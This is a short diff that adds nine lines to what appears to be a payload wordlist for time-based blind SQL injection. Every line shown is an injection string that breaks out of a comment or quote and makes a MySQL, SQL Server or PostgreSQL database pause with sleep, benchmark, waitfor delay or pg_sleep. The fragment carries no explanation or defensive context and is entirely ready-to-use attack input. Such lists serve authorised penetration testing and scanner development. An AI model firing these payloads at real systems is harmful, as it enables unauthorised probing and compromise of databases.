@@ -140,3 +140,12 @@ ORDER BY SLEEP(3)#
 +benchmark(3200,SHA1(1))+'
 + SLEEP(3) + '
 SLEEP(3)/*' or SLEEP(3) or '" or SLEEP(3) or "*/
+*/ sleep(3)
+*/ sleep(3)#
+*/ sleep(3)--
+*/ sleep(3)="
+*/ sleep(3)='
+*/ waitfor delay '0:0:03';--
+*/ pg_SLEEP(3)
+*/ pg_SLEEP(3)--
+*/ pg_SLEEP(3)#
